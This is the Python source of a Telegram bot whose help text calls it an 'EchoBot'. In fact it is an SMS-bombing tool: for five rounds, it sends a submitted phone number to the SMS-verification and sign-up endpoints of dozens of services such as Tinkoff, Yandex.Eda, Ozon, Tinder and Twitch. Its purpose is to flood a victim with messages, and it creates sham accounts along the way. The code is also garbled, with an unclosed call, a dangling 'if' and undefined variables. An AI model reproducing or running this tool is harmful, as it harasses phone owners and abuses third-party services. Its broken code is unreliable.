import telebot
import os
import requests, random, datetime, sys, time, argparse, os
import mysql.connector as connect_sql

from telebot import apihelper
from colorama import Fore, Back, Style

API_TOKEN = os.environ.get('BOT_TOKEN')
DB_NAME = os.environ.get('DB_NAME')
DB_PASS = os.environ.get('DB_PASS')

bot = telebot.TeleBot(API_TOKEN)

conn = connect_sql.connect(
        host = 'remotemysql.com',
        user = DB_NAME,
        passwd = DB_PASS,
        database = DB_NAME


# Handle '/start' and '/help'
@bot.message_handler(commands=['help', 'start'])
def send_welcome(message):
    print( """\
Hi there, I am EchoBot.
I am here to echo your kind words back to you. Just say anything nice and I'll say the exact same thing to you!\
""")
apihelper.ENABLE_MIDDLEWARE = True

INFO_STATE = 'ON_INFO_MENU'
MAIN_STATE = 'ON_MAIN_MENU'

SESSIONS = {
    -10000: {
        'state': INFO_STATE
    },
    -11111: {
        'state': MAIN_STATE
    }
}


def get_or_create_session(user_id):
    try:
        return SESSIONS[user_id]
    except KeyError:
        SESSIONS[user_id] = {'state': MAIN_STATE}
        return SESSIONS[user_id]

# Handle all other messages with content_type 'text' (content_types defaults to ['text'])
@bot.message_handler(func=lambda message: True)
def echo_message(message):
    _phone = message.text
    if _phone[0] == '+':
        _phone = _phone[1:]
    if _phone[0] == '8':
        _phone = '7'+_phone[1:]
    if _phone[0] == '9':
        _phone = '7'+_phone

    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    _phone9 = _phone[1:]
    _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
    _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
    _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
    _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
    _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
    
    i = 5
    while i != 0:
		if i == 0:
			return;
        try:
            requests.post("https://api.sunlight.net/v3/customers/authorization/",
                data={"phone": _phone})
            print('[+] SunLight отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate",
                json={"phone": _phone9})
            print('[+] IqOS отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                data={
                    "SignupForm[username]": _phone,
                    "SignupForm[device_type]": 3,
                })
            print('[+] DeliMobi отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post("https://plink.tech/register/", json={"phone": _phone})
            print('[+] Plink.tech отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post("https://www.citilink.ru/registration/confirm/phone/+"
                + _phone
                + "/"
            )
            print('[+] Ситилинк отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
                params={"pageName": "registerPrivateUserPhoneVerificatio"})
            print('[+] MVideo отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",
                data={"msisdn": _phone},
                headers={"App-ID": "cabinet"})
            print('[+] wi-fi.ru отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post("https://api.tinkoff.ru/v1/sign_up",
                data={"phone": "+" + _phone})
            print('[+] ube.pmsm.org.ru отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
                json={"phone": "+" + _phone})
            print('[+] KFC отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post("https://eda.yandex/api/v1/user/request_authentication_code",
                json={"phone_number": "+" + _phone})
            print('[+] Yandex.Eda отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone})
            print('[+] Yandec.Chef отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
            print('[+] ube.pmsm.org.ru отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post('https://findclone.ru/register', params={'phone': '+' + _phone})
            print('[+] FindClone call отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
                json={"phone": _phone, "otpId": 0},
            )
            print('[+] Ozon отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                data={
                    "mode": "request",
                    "phone": "+" + _phone,
                    "phone_permission": "unknown",
                    "stream_id": 0,
                    "v": 3,
                    "appversion": "3.20.6",
                    "osversion": "unknown",
                    "devicemodel": "unknown",
                })
            print('[+] InDriver отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://cloud.mail.ru/api/v2/notify/applink",
                json={
                    "phone": "+" + _phone,
                    "api": 2,
                    "email": "email",
                    "x-email": "x-email",
                },)
            print('[+] MailCloud отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone},)
            print('[+] QLean отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone},)
            print('[+] List отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + _phone},)
            print('[+] Lenta отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://b.utair.ru/api/v1/login/',
           data = {'login': _phone},
           headers = {
           'Accept-Language':'en-US,en;q=0.5',
           'Connection':'keep-alive',
           'Host':'b.utair.ru',
           'origin':'https://www.utair.ru',
           'Referer':'https://www.utair.ru/'})
           
            print('[+] Utair отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post('https://b.utair.ru/api/v1/login/',
           data = {'login': _phone},
           headers = {
           'Accept-Language':'en-US,en;q=0.5',
           'Connection':'keep-alive',
           'Host':'b.utair.ru',
           'origin':'https://www.utair.ru',
           'Referer':'https://www.utair.ru/'})
           
            print('[+] Utair отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post('https://b.utair.ru/api/v1/login/',
           data = {'login': _phone},
           headers = {
           'Accept-Language':'en-US,en;q=0.5',
           'Connection':'keep-alive',
           'Host':'b.utair.ru',
           'origin':'https://www.utair.ru',
           'Referer':'https://www.utair.ru/'})
           
            print('[+] Utair отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data = {'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print('[+] Tinder отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print('[+] Karusel отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            print('[+] Tinkoff отправлено!')
        except:
            print('[-] Не отправлено!')


        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print('[+] Youla отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
            print('[+] Rutube отправлено!')
        except:
            print('[+] Не отправлено!')


        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print('[+] Beltelcom отправлено!')
        except:
            print('[-] Не отправлено!')


        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print('[+] KFC отправлено!')
        except:
            print('[-] Не отправлено!')


        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print('[+] ICQ отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
            print('[+] Invitro отправлено!')
        except:
            print('[-] Не отправлено!')


        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
            print('[+] IVI отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
            print('[+] Lenta отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print('[+] Mail.ru отправлено!')
        except:
            print('[-] Не отправлено!')


        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
            print('[+] OK отправлено!')
        except:
            print('[-] Не отправлено!')


        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
            print('[+] Tinder отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print('[+] Twitch отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
            print('[+] Eda.Yandex отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print('[+] Youla отправлено!')
        except:
            print('[-] Не отправлено!')
        i = i-1
        print('Круг пройден ' + 5-i)
		if(i == 5):
			
    


bot.polling()
